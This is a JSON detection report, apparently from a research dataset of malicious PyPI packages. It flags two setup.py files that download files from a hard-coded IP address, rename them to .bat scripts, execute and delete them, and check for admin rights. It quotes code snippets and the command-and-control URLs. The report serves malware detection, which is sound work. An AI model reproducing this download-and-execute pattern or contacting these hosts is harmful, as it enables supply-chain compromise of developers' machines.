{
  "package_name": "74998f80f6b52c92a324a73856a2cbf813437842",
  "total_matches": 20,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
      "file_name": "setup.py",
      "detection_count": 10,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is highly malicious. It contains obfuscated logic that, when running on Windows, downloads files from a suspicious external server (http://52.14.229.35:1122/connect-CANDC.txt and http://52.14.229.35:1122/shoomsha.jpg), saves them as .txt files, renames them to .bat files, and then executes them using the Windows command shell. This is a classic pattern for downloading and executing arbitrary code (potentially malware) from a remote command-and-control (C2) server. The code also attempts to clean up after itself by deleting the .bat files, and checks for administrative privileges using 'net session'. The use of obfuscated variable names and the abuse of the setup script to hide this logic further indicate malicious intent.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "69",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "BeQPIlDbUaRwLnmpztkloiwfqrXWQPdR = subprocess.Popen('echo %temp%', shell=True, CiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=subprocess.\nQCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOP...bzzGOdlC)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:69",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "87",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_copy.txt local.bat', shell=True,\nCiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGO...bzzGOdlC)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:87",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "90",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c local.bat', shell=True, CiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=subprocess.\nQCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, stderr=subproc...bzzGOdlC)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:90",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "94",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del local.bat', shell=True, CiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=\nsubprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, st...        )",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:94",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "99",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "BeQPIlDbUaRwLnmpztkloiwfqrXWQPdR = subprocess.Popen('net session', shell=True, CiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=subprocess.\nQCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOP...bzzGOdlC)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:99",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "112",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_b.txt loc.bat', shell=True,\nCiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbz...bzzGOdlC)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:112",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "115",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c loc.bat', shell=True, CiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=subprocess\n.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, stderr=s...bzzGOdlC)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:115",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "119",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del loc.bat', shell=True, CiNNnInUzVEzHrzwCPfROTuzWUbUjEHx=\nsubprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOdlC, bAkNBAnXXbwdROPlZVZRXxitVQqXPMNe=subprocess.QCoRkvzuhrEGBxjuOPhRpOqFbzzGOd...bzzGOdlC)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:119",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "82",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "bRdHGPspJrpIGyfyaqnyGQUhSvyHlRFV = 'http://52.14.229.35:1122/connect-CANDC.txt'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at obfuscated/setup.py:82",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "107",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "bRdHGPspJrpIGyfyaqnyGQUhSvyHlRFV = 'http://52.14.229.35:1122/shoomsha.jpg'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at obfuscated/setup.py:107",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        }
      ]
    },
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
      "file_name": "setup.py",
      "detection_count": 10,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "The code contains several clear indicators of malicious behavior: (1) It downloads files from a suspicious remote server (http://52.14.229.35:1122/connect-CANDC.txt and http://52.14.229.35:1122/shoomsha.jpg), which are likely to be command-and-control (C2) payloads. (2) It saves these files locally and renames them to .bat files, then executes them using the Windows command shell. (3) It attempts to delete these .bat files after execution, which is a common tactic to cover tracks. (4) The code checks for administrative privileges using 'net session', and displays a misleading message if not run as admin. (5) The code is hidden in what appears to be a setup.py file, which is a common technique for supply chain attacks. (6) The use of shell=True and direct execution of downloaded content is highly dangerous and typical of malware. All these behaviors are consistent with malware that attempts to download and execute arbitrary code from an external server, potentially giving an attacker remote control over the system.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "87",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "a = subprocess.Popen('echo %temp%', shell=True, stdin=subprocess.\nPIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:87",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "105",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_copy.txt local.bat', shell=True,\nstdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=\nsubprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:105",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "108",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c local.bat', shell=True, stdin=subprocess.\nPIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:108",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "112",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del local.bat', shell=True, stdin=\nsubprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:112",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "117",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "a = subprocess.Popen('net session', shell=True, stdin=subprocess.\nPIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:117",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "130",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_b.txt loc.bat', shell=True,\nstdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=\nsubprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:130",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "133",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c loc.bat', shell=True, stdin=subprocess\n.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:133",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "137",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del loc.bat', shell=True, stdin=\nsubprocess.PIPE, stdout=subprocess.PIPE, stderr=\nsubprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:137",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "100",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:100",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "125",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:125",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/74998f80f6b52c92a324a73856a2cbf813437842/setup.py",
          "relative_path": "setup.py"
        }
      ]
    }
  ]
}